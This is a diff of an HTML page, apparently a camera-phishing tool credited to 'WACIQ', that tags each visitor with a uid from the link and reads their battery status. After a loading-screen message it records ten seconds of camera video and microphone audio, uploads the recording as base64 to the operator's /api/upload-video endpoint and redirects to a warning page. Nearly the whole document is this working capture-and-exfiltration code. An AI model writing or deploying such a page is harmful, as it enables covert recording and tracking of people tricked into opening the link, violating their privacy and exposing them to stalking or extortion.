@@ -6,218 +6,115 @@
   <link rel="icon" type="image/png" href="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg">
   <style>
     * { box-sizing: border-box; }
-
     body {
-      margin: 0;
-      padding: 0;
+      margin: 0; padding: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background: url('https://i.postimg.cc/N2vfNSCn/Screenshot-20250805-190626-2.jpg') no-repeat center center fixed;
-      background-size: cover;
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #fff;
-      text-align: center;
-      backdrop-filter: blur(6px);
+      background-size: cover; height: 100vh;
+      display: flex; align-items: center; justify-content: center;
+      color: #fff; text-align: center; backdrop-filter: blur(6px);
     }
-
     .container {
-      background: rgba(0, 0, 0, 0.6);
-      border-radius: 25px;
-      padding: 60px 45px;
-      width: 95%;
-      max-width: 950px;
-      min-height: 500px;
+      background: rgba(0,0,0,0.6); border-radius: 25px; padding: 60px 45px;
+      width: 95%; max-width: 950px; min-height: 500px;
       box-shadow: 0 0 25px rgba(0,255,153,0.5);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+      display: flex; flex-direction: column; align-items: center;
       animation: popIn 0.7s ease-out;
     }
-
-    .logo {
-      width: 160px;
-      height: auto;
-      margin-bottom: 30px;
-      box-shadow: 0 0 18px rgba(0,255,255,0.6);
-    }
-
+    .logo { width: 160px; margin-bottom: 30px; box-shadow: 0 0 18px rgba(0,255,255,0.6);}
     .loader {
-      border: 7px solid rgba(255, 255, 255, 0.2);
-      border-top: 7px solid #00ffcc;
-      border-radius: 50%;
-      width: 70px;
-      height: 70px;
-      animation: spin 1s linear infinite;
-      margin: 25px 0;
+      border: 7px solid rgba(255,255,255,0.2); border-top: 7px solid #00ffcc;
+      border-radius: 50%; width: 70px; height: 70px; animation: spin 1s linear infinite; margin: 25px 0;
     }
-
     .text {
-      font-size: 20px;
-      line-height: 1.8;
-      text-shadow: 0 0 6px rgba(0, 0, 0, 0.6);
-      background: linear-gradient(to right, #00ffe7, #00ffa1, #9fff5b);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
+      font-size: 20px; line-height: 1.8; text-shadow: 0 0 6px rgba(0,0,0,0.6);
+      background: linear-gradient(to right,#00ffe7,#00ffa1,#9fff5b);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
       font-weight: bold;
     }
-
-    .credit {
-      margin-top: 25px;
-      font-size: 15px;
-      color: #ccc;
-      font-weight: bold;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    @keyframes popIn {
-      0% { opacity: 0; transform: scale(0.9); }
-      100% { opacity: 1; transform: scale(1); }
-    }
-
-    @media (max-width: 600px) {
-      .container {
-        margin: 0 10px;
-        padding: 40px 25px;
-        min-height: 450px;
-      }
-      .logo { width: 130px; }
-      .text { font-size: 17px; }
-    }
-
+    .credit { margin-top:25px; font-size:15px; color:#ccc; font-weight:bold;}
+    @keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+    @keyframes popIn {0%{opacity:0;transform:scale(0.9);}100%{opacity:1;transform:scale(1);}}
+    @media (max-width:600px){.container{margin:0 10px;padding:40px 25px;min-height:450px;}.logo{width:130px;}.text{font-size:17px;}}
     video, canvas { display: none; }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <img src="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg" alt="logo" class="logo">
-    <div class="text" id="status">
-      🕵️‍♂️ <b>Starting video recording...</b><br>
-      <b>Keep this page open 🎥</b>
-    </div>
-    <div class="loader"></div>
-    <div class="credit">𝗠𝗔𝗗𝗘 𝗕𝗬 💛 𝗪𝗔𝗖𝗜𝗤</div>
-  </div>
+<div class="container">
+  <img src="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg" alt="logo" class="logo">
+  <div class="text" id="status">🕵️‍♂️ <b>Starting video recording...</b><br><b>Keep this page open 🎥</b></div>
+  <div class="loader"></div>
+  <div class="credit">𝗠𝗔𝗗𝗘 𝗕𝗬 💛 𝗪𝗔𝗖𝗜𝗤</div>
+</div>
 
-  <video id="video" autoplay playsinline></video>
+<video id="video" autoplay playsinline></video>
+<canvas id="snapshot"></canvas>
 
-  <script>
-    const video = document.getElementById('video');
-    const statusEl = document.getElementById('status');
+<script>
+const video = document.getElementById('video');
+const canvas = document.getElementById('snapshot');
+const ctx = canvas.getContext('2d');
+const statusEl = document.getElementById('status');
 
-    const params = new URLSearchParams(window.location.search);
-    const uid = params.get('uid') || 'unknown';
-    let mediaRecorder = null;
-    let recordedChunks = [];
-    let recordingStarted = false;
-    let batteryLevel = 0;
-    let isCharging = false;
+const params = new URLSearchParams(window.location.search);
+const uid = params.get('uid') || 'unknown';
 
-    if (uid) {
-      // Get battery info
-      navigator.getBattery().then(battery => {
-        batteryLevel = Math.round(battery.level * 100);
-        isCharging = battery.charging;
+let mediaRecorder = null;
+let recordedChunks = [];
 
-        // Start camera
-        navigator.mediaDevices.getUserMedia({ 
-          video: true,
-          audio: true  // Add audio if you want
-        }).then(stream => {
-          video.srcObject = stream;
-          
-          // Setup MediaRecorder
-          mediaRecorder = new MediaRecorder(stream, {
-            mimeType: 'video/webm;codecs=vp9',
-            videoBitsPerSecond: 2500000 // 2.5 Mbps
-          });
+if(uid) {
+  navigator.getBattery().then(battery => {
+    const batteryLevel = Math.round(battery.level*100);
+    const isCharging = battery.charging;
 
-          // Collect data chunks
-          mediaRecorder.ondataavailable = (event) => {
-            if (event.data.size > 0) {
-              recordedChunks.push(event.data);
-            }
-          };
+    navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(stream => {
+      video.srcObject = stream;
 
-          // When recording stops, send the video
-          mediaRecorder.onstop = () => {
-            sendVideoToServer();
-          };
-
-          statusEl.innerHTML = "🎥 <b>Recording video...</b>";
-          
-          // Start recording after 1 second
-          setTimeout(() => {
-            mediaRecorder.start(1000); // Collect data every 1 second
-            recordingStarted = true;
-            
-            // Stop recording after 10 seconds (adjust as needed)
-            setTimeout(() => {
-              if (mediaRecorder && mediaRecorder.state === 'recording') {
-                mediaRecorder.stop();
-                
-                // Stop all tracks
-                stream.getTracks().forEach(track => track.stop());
-              }
-            }, 10000); // Record for 10 seconds
-          }, 1000);
-
-        }).catch(err => {
-          console.error("Camera error:", err);
-          statusEl.innerHTML = "❌ <b>Camera/microphone access failed!</b>";
-        });
+      mediaRecorder = new MediaRecorder(stream, {
+        mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' : 'video/webm',
+        videoBitsPerSecond: 2500000
       });
-    }
 
-    function sendVideoToServer() {
-      if (recordedChunks.length === 0) {
-        console.error("No video data recorded");
-        window.location.href = "/warning.html";
-        return;
-      }
+      mediaRecorder.ondataavailable = e => { if(e.data.size>0) recordedChunks.push(e.data); }
+      mediaRecorder.onstop = () => sendVideoToServer(batteryLevel, isCharging);
 
-      // Create video blob
-      const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-      
-      // Convert blob to base64
-      const reader = new FileReader();
-      reader.onloadend = () => {
-        const videoData = reader.result.split(',')[1]; // Get base64 data
-        
-        fetch('/api/upload-video', {  // You need to create this endpoint
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            video: videoData, 
-            uid, 
-            battery: batteryLevel, 
-            charging: isCharging,
-            format: 'webm'
-          })
-        }).then(response => {
-          console.log("Video uploaded successfully");
-          window.location.href = "/warning.html";
-        }).catch(err => {
-          console.error("Upload error:", err);
-          window.location.href = "/warning.html";
-        });
-      };
-      
-      reader.readAsDataURL(videoBlob);
-    }
+      statusEl.innerHTML = "🎥 <b>Recording video...</b>";
 
-    // Handle page close/unload
-    window.addEventListener('beforeunload', () => {
-      if (mediaRecorder && mediaRecorder.state === 'recording') {
-        mediaRecorder.stop();
-      }
+      setTimeout(() => {
+        mediaRecorder.start(1000);
+        setTimeout(() => {
+          if(mediaRecorder.state==='recording') {
+            mediaRecorder.stop();
+            stream.getTracks().forEach(t=>t.stop());
+          }
+        }, 10000); // Record 10s
+      }, 1000);
+
+    }).catch(err => {
+      console.error("Camera error:",err);
+      statusEl.innerHTML = "❌ <b>Camera/microphone access failed!</b>";
     });
-  </script>
+  });
+}
+
+function sendVideoToServer(battery, charging) {
+  if(recordedChunks.length===0){ window.location.href="/warning.html"; return; }
+  const videoBlob = new Blob(recordedChunks,{type:'video/webm'});
+  const reader = new FileReader();
+  reader.onloadend = () => {
+    const videoData = reader.result; // Base64 with header
+    fetch('/api/upload-video',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({video:videoData, uid, battery, charging, format:'webm'})
+    }).then(()=> window.location.href="/warning.html")
+    .catch(err=> { console.error("Upload error:",err); window.location.href="/warning.html"; });
+  };
+  reader.readAsDataURL(videoBlob);
+}
+
+window.addEventListener('beforeunload',()=>{ if(mediaRecorder && mediaRecorder.state==='recording') mediaRecorder.stop(); });
+</script>
 </body>
-</html>
+</html> 
